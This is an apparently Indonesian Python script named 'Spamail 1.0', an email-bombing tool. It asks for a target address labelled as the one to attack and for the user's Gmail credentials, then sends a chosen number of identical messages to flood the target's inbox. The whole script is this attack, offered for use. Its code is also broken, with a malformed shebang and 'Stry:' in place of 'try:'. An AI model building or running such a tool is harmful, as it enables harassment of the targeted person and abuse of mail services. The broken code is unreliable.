#usr/bin/python2
#achmadsofyanhadi
#recode gak akan jadiin lu mastah

import smtplib
import time
import sys



print ("\033[1;31m   ________  ________  ________  _____ ______   ________  ___  ___           \033[1;m") 
print ("\033[1;31m |\   ____\|\   __  \|\   __  \|\   _ \  _   \|\   __  \|\  \|\  \           \033[1;m")
print ("\033[1;31m \ \  \___|\ \  \|\  \ \  \|\  \ \  \\\__\ \  \ \  \|\  \ \  \ \  \          \033[1;m")
print ("\033[1;31m  \ \_____  \ \   ____\ \   __  \ \  \\|__| \  \ \   __  \ \  \ \  \         \033[1;m")
print ("\033[1;31m   \|____|\  \ \  \___|\ \  \ \  \ \  \    \ \  \ \  \ \  \ \  \ \  \____    \033[1;m")
print ("\033[1;31m     ____\_\  \ \__\    \ \__\ \__\ \__\    \ \__\ \__\ \__\ \__\ \_______\  \033[1;m")
print ("\033[1;31m    |\_________\|__|     \|__|\|__|\|__|     \|__|\|__|\|__|\|__|\|_______|  \033[1;m")
print ("\033[1;31m    \|_________|                                                             \033[1;m")
print ("\033[1;31m                             Spamail 1.0 / Coded By Achmad Sofyan H         \033[1;m")

Stry:
    spam_mail = input("Masukkan Email Yang Akan Di Attack: ")
    email = input("Masukkan Email Lu:")
    password = input("Masukkan Password Nya")
    pesan = input("Lastwords ?:")
    counter = int(input("Berapa Banyak Pesan Yang Mau Anda Kirimkan ?:"))

    for x in range(0,counter):
        print("Banyak Pesan Yang Dikirimkan : ", x+1)
        mail = smtplib.SMTP('smtp.gmail.com',587)
        mail.ehlo()
        mail.starttls()
        mail.login(email,password)
        mail.sendmail(email,spam_mail,pesan)
        time.sleep(1)
    mail.close()
except Exception as e:
    print("Terimah kasih sudah mengunakan tols ini :) ,Jika terdapat eror silahkan untuk menggulanggi tols dari awal !")
